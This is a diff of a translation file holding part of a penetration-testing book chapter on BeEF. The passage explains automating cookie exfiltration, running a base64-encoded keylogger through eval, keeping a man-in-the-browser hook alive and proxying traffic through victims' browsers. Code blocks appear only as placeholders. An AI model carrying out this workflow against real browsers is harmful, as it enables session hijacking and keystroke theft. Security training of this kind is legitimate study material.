     as the victim visits the infected page. The Man-In-The-Browser module will keep
     the hook alive if the victim decides to click around the application. The Get
     Cookie module will hopefully exfiltrate session cookies in case they decide to
     close the browser altogether.
+  id: totrans-341
   prefs: []
   type: TYPE_NORMAL
 - en: As you may have guessed, we can also automatically run the Raw Javascript module,
     which will allow us to execute arbitrary JavaScript as soon as a hooked browser
     comes online. A good candidate for this is our custom keylogger.
+  id: totrans-342
   prefs: []
   type: TYPE_NORMAL
 - en: 'First, we have to create a rule that will instruct BeEF to execute the `raw_javascript`
     module:'
+  id: totrans-343
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE38]'
+  id: totrans-344
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE38]'
 - en: We don't want to impose any conditions on running this rule, but we do have
     to specify a payload for execution. The `raw_javascript` module takes one option,
     `cmd`, which is the raw JavaScript code to execute.
+  id: totrans-345
   prefs: []
   type: TYPE_NORMAL
 - en: Now, because the rule is in JSON format, we will Base64-encode our keylogger
@@ -1603,72 +2209,94 @@
     code in the JSON file, we'd have to compress it using a JavaScript minifier and
     escape any double quotes within the code. This is a bit messy, so we'll take the
     simpler route.
+  id: totrans-346
   prefs: []
   type: TYPE_NORMAL
 - en: 'We can quickly encode the keylogger using something like CyberChef (or JavaScript''s
     `btoa()` function):'
+  id: totrans-347
   prefs: []
   type: TYPE_NORMAL
 - en: '![Automatic exploitation](graphics/B09238_09_17.jpg)'
+  id: totrans-348
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.17: CyberChef Base64-encoding the custom keylogger code'
+  id: totrans-349
   prefs: []
   type: TYPE_NORMAL
 - en: To run the Base64-encoded keylogger code, we have to pass it to `atob()`, JavaScript's
     Base64 decoder, before using `eval()` to actually execute the code.
+  id: totrans-350
   prefs: []
   type: TYPE_NORMAL
 - en: 'The Raw JavaScript command input will look something like this:'
+  id: totrans-351
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE39]'
+  id: totrans-352
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE39]'
 - en: Finally, we can add this value to our Raw JavaScript ARE rule JSON file. This
     particular module expects a `cmd` option to be set, and this is where we put our
     one-liner.
+  id: totrans-353
   prefs: []
   type: TYPE_NORMAL
 - en: 'The final rule will look like this:'
+  id: totrans-354
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE40]'
+  id: totrans-355
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE40]'
 - en: 'Each module will require its own specific options to run properly. BeEF is
     an open-source software, so we can inspect the code to figure out what these options
     are:'
+  id: totrans-356
   prefs: []
   type: TYPE_NORMAL
 - en: '![Automatic exploitation](graphics/B09238_09_18.jpg)'
+  id: totrans-357
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.18: BeEF GitHub source code'
+  id: totrans-358
   prefs: []
   type: TYPE_NORMAL
 - en: 'Restarting BeEF will load our new ARE rule alongside the other two canned rules:'
+  id: totrans-359
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE41]'
+  id: totrans-360
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE41]'
 - en: All new hooked victims will have their cookies exfiltrated, a custom keylogger
     executed, and persistence enabled via the MITB attack.
+  id: totrans-361
   prefs: []
   type: TYPE_NORMAL
 - en: Tunneling traffic
+  id: totrans-362
   prefs:
   - PREF_H2
   type: TYPE_NORMAL
 - en: Perhaps the coolest feature in BeEF is the ability to tunnel your traffic through
     the hooked victim's browser. BeEF will set up a local proxy that will forward
     web requests through the C2 and back out to the victim.
+  id: totrans-363
   prefs: []
   type: TYPE_NORMAL
 - en: On the client-side, traffic forwarding is done using XHR, and therefore, requests
     are subject to SOP. This essentially limits us to the hooked domain. While this
     is not ideal, there are still some practical applications.
+  id: totrans-364
   prefs: []
   type: TYPE_NORMAL
 - en: Consider a scenario where an internal admin interface is vulnerable to an XSS
@@ -1679,50 +2307,66 @@
     could browse the admin interface just fine. What's more, we'd be authenticated
     as the victim automatically, thanks to the browser passing along cookies with
     every request.
+  id: totrans-365
   prefs: []
   type: TYPE_NORMAL
 - en: 'Tunneling traffic is easy; we just right-click on a hooked client and select
     **Use as Proxy**:'
+  id: totrans-366
   prefs: []
   type: TYPE_NORMAL
 - en: '![Tunneling traffic](graphics/B09238_09_19.jpg)'
+  id: totrans-367
   prefs: []
   type: TYPE_IMG
 - en: 'Figure 9.19: Using a victim as a proxy'
+  id: totrans-368
   prefs: []
   type: TYPE_NORMAL
 - en: 'When BeEF starts, it also runs a proxy service on the localhost, which will
     route traffic through the hooked victim''s browsers if enabled:'
+  id: totrans-369
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE42]'
+  id: totrans-370
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE42]'
 - en: 'We can see this traffic proxy in action by using `curl` and specifying the
     default BeEF proxy service (`127.0.0.1:6789`) using the `-x` parameter:'
+  id: totrans-371
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE43]'
+  id: totrans-372
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE43]'
 - en: Not only were we able to browse the `badguys.local` domain, but we also did
     it from our C2 server in the cloud. Name resolution and packet routing is not
     a problem for the attacker, thanks to our malicious code running inside the victim's
     browser.
+  id: totrans-373
   prefs: []
   type: TYPE_NORMAL
 - en: Note
+  id: totrans-374
   prefs:
   - PREF_H3
   type: TYPE_NORMAL
 - en: 'Remember that SOP applies when tunneling traffic as well. We can send requests
     to arbitrary domains and ports, but we cannot read the contents of the response:'
+  id: totrans-375
   prefs: []
   type: TYPE_NORMAL
 - en: '[PRE44]'
+  id: totrans-376
   prefs: []
   type: TYPE_PRE
+  zh: '[PRE44]'
 - en: Summary
+  id: totrans-377
   prefs:
   - PREF_H1
   type: TYPE_NORMAL
@@ -1730,6 +2374,7 @@
     We looked at the three more common types of XSS: reflected, stored, and DOM, as
     well as CSRF, and chaining these attacks together. We also covered the SOP and
     how it affects loading third-party content or attack code onto the page.'
+  id: totrans-378
   prefs: []
   type: TYPE_NORMAL
 - en: The chapter showcased the built-in BeEF keylogger and even showed how to create
@@ -1738,6 +2383,7 @@
     is a real problem with XSS in particular, but using MITB attacks, we managed to
     extend our foothold on the client. Finally, we explored automating exploitation
     with BeEF's ARE and we even tunneled HTTP traffic through a victim's browser.
+  id: totrans-379
   prefs: []
   type: TYPE_NORMAL
 - en: The purpose of this chapter was to show that client-side attacks can be practical
@@ -1745,5 +2391,6 @@
     CSRF attacks can be combined to do some real damage to targets. In the next chapter,
     we will switch gears from attacking users to attacking the server itself, by way
     of XML.
+  id: totrans-380
   prefs: []
   type: TYPE_NORMAL
